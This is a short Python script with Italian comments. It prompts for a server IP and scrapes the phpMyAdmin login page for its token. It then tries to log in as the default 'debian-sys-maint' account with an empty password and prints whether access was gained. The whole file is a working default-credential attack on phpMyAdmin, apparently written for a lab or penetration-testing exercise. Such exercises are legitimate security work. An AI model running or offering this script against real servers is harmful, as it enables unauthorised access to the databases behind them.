import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style

user = "debian-sys-maint"
pwd = ""

IP = input("Inserisci indirizzo IP del server: ")
login_phpMyAdmin = "http://" + IP + "/phpMyAdmin/"

print(Fore.YELLOW + "Tentativi di login all'url: ", login_phpMyAdmin + Style.RESET_ALL)
# Creazione della sessione
session = requests.Session()

# Richiesta GET per recupero token e parametro phpMyAdmin
response = session.get(login_phpMyAdmin)

# Analizza l'HTML della risposta
soup = BeautifulSoup(response.text, 'html.parser')

# Trova il campo del token e ottiene il suo valore
token_field = soup.find('input', {'name': 'token'})
token_value = token_field['value'] if token_field else None

# Trova tutti i campi con nome phpMyAdmin e ottiene il valore
phpmyadmin_fields = soup.find_all('input', {'name': 'phpMyAdmin'})
phpmyadmin_value = phpmyadmin_fields[0]['value'] if phpmyadmin_fields else None

# Payload
login_data = {
    'phpMyAdmin': [phpmyadmin_value] * 3,
    'pma_username': user,
    'pma_password': pwd,
    'server': '1',
    'lang': 'en-utf-8',
    'convcharset': 'utf-8',
    'token': token_value
}

response = session.post(login_phpMyAdmin, data=login_data) # Richiesta POST per il login
print(response.text)
# Verifica se il login è avvenuto con successo
if "Access denied" in response.text:
	print(Fore.RED + "Login fallito!" +  Style.RESET_ALL)
else:
	print(Fore.GREEN + "Login avvenuto con successo!" +  Style.RESET_ALL)



		
		

